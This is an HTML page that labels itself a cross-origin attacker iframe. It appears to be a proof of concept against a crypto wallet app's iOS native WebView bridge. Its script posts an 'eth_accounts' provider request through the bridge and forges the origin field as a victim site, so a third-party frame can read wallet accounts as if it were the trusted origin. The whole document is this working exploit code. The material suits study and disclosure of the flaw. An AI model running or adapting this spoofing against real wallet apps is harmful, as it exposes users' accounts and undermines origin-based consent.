<!doctype html>
<meta charset="utf-8">

Cross-origin attacker iframe.

<script>
const victimOrigin =
  new URLSearchParams(location.search)
    .get('victimOrigin');

if (
  !victimOrigin ||
  new URL(victimOrigin).origin !== victimOrigin
) {
  throw new Error('Invalid victimOrigin');
}


function nativeRequest(id) {

  const message = JSON.stringify({
    method: 'provider_request',

    payload: JSON.stringify({
      id,

      /*
       * Actual sender = Origin B
       * Claimed origin = Origin A
       */
      origin: victimOrigin,

      request: {
        method: 'eth_accounts',
        params: []
      }
    })
  });


  const bridge =
    window.webkit?.messageHandlers
      ?.ReactNativeWebView;


  if (!bridge?.postMessage) {
    throw new Error(
      'Core iOS native bridge unavailable'
    );
  }


  bridge.postMessage(message);
}


addEventListener('message', event => {

  if (event.source !== parent) return;
  if (event.origin !== victimOrigin) return;

  if (event.data?.type !== 'READ_ACCOUNTS')
    return;


  nativeRequest(
    event.data.id
  );


  parent.postMessage(
    {
      type: 'REQUEST_SENT'
    },
    victimOrigin
  );
});


parent.postMessage(
  {
    type: 'READY'
  },
  victimOrigin
);
</script>
